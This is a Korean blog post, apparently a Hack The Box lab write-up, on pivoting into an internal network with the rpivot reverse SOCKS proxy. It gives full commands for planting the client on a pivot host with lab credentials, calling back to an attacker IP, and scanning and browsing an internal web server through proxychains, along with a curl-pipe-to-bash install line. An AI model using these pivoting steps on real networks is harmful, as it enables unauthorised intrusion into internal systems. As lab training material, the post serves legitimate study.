---
title: "Web Server Pivoting with Rpivot"
date: 2025-09-30
layout: single
author_profile: true
toc: true
toc_label: "Rpivot Pivoting"
toc_icon: "network-wired"
toc_sticky: true
tags: [networking, ssh, tunneling, pivoting, socks, reverse]
header:
  teaser: /assets/network-screenshots/rpivot/rpivot-network.png
---

**Rpivot**은 Python으로 작성된 **역방향(Reverse) SOCKS 프록시 도구**로, 내부망 호스트가 외부 서버로 연결을 맺고, 외부 서버 측에서 **SOCKS 프록시 포트**를 열어주어 공격자가 프록시를 통해 내부망에 접근할 수 있게 한다.

---

# 시나리오

![Rpivot Pivot Diagram](/assets/network-screenshots/rpivot/rpivot-network.png)

Rpivot을 이용해 공격자가 외부에서 내부 웹 서버로 접근하는 구조이다.

내부망(`172.16.5.0/23`)에 존재하는 **웹 서버(`172.16.5.135`)**가 있고,  
공격자는 외부 네트워크(HTB Lab)에서 이 웹 서버를 직접 스캔하거나 브라우징을 할수있다.

---

# 설치

먼저 `rpivot` 저장소를 클론한다.

```bash
$ git clone https://github.com/klsecservices/rpivot.git 

Cloning into 'rpivot'...
remote: Enumerating objects: 37, done.
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37 (from 1)
Receiving objects: 100% (37/37), 51.20 KiB | 3.66 MiB/s, done.
Resolving deltas: 100% (6/6), done.
```

`rpivot`은 **Python 2.7 환경에서 동작**하므로 우선 Python 2.7을 설치해야 한다.

```bash
$ sudo apt-get install python2.7
```

에러가 발생할 경우, 이때는 `pyenv`를 사용하여 별도로 2.7 버전을 설치할 수 있다.

```bash
$ curl https://pyenv.run | bash
$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
$ source ~/.bashrc
$ pyenv install 2.7
$ pyenv shell 2.7
```

--- 

# 실습

## server.py 활성화

공격자 로컬 머신에서 `rpivot` 디렉토리로 이동 후 **SOCKS 프록시 서버(server.py)**를 실행한다.

```bash
$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

- **--proxy-port 9050** : 로컬에서 프록시 트래픽을 받을 포트 (SOCKS5)
- **--server-port 9999** : 클라이언트(피벗 호스트)가 접속할 포트
- **--server-ip 0.0.0.0** : 모든 인터페이스에서 연결 허용

이후, `scp` 명령어를 이용하여 문제에서 제공한 SSH 서버(`ubuntu:HTB_@cademy_stdnt!`) 로 전송을 하였다.

```bash
$ scp -r rpivot ubuntu@10.129.179.177:/home/ubuntu
```

전송 완료 후, 제공된 계정으로 피벗 호스트에 SSH 접속하였다.

```bash
$ ssh ubuntu@10.129.179.177
```

## client.py 활성화

`scp`로 전송한 **rpivot 디렉토리**로 이동한 뒤, `client.py` 스크립트를 실행한다.

```bash
$ python2.7 client.py --server-ip 10.10.15.86 --server-port 9999
```

로컬 호스트에서 **SOCKS 프록시 서버(server.py)** 를 실행해 두었던 터미널을 확인하면, 피벗 호스트가 성공적으로 접속한 로그가 출력된다.

```bash
New connection from host 10.129.179.177, source port 36508
```

이후, 내부망 웹 서버 `172.16.5.135`의 80 번 포트를 `proxychains`를 적용하여 확인하였다.

```bash
$ proxychains nc -vz 172.16.5.135 80

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.135:80  ...  OK
172.16.5.135 [172.16.5.135] 80 (http) open : Operation now in progress
```

출력 결과에서 `80 (http) open` 메시지를 통해 해당 포트가 열려 있음을 확인할 수 있다.

## proxychains 웹 사이트 연결 && Flag 획득

로컬 호스트에서 `proxychains`를 적용하여 내부망 웹 사이트에 접속하였다.

```bash
$ proxychains firefox-esr 172.16.5.135:80
```

정상적으로 내부망 웹 페이지 접속에 성공했고, 웹 페이지에 적혀 있는 플래그를 확인하여 획득하였다.

![Rpivot Pivot Diagram](/assets/network-screenshots/rpivot/flag.png)

이로써 **Rpivot** 사용법에 대한 실습을 마무리하였다.